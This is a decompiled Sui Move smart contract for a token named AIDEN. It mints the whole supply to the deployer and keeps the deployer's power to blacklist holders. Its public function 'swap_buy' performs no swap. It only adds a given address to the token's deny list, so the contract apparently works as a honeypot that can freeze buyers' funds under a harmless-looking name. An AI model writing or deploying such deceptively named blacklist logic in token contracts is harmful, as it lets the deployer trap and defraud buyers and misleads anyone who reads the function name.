module 0xd9f6b03e46a17a3f8ecc2bccdf083f7fbb25d6db588f69d2d684dae4e2fae4f1::aiden {
    struct AIDEN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: AIDEN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AIDEN>(arg0, 9, b"AIDEN", b"AI_den_bot", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmdv1SphrpWskFq4wwYHwYyPk6SuLJJ2GwD9PSSEKnGtaw"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AIDEN>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AIDEN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AIDEN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AIDEN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AIDEN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AIDEN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

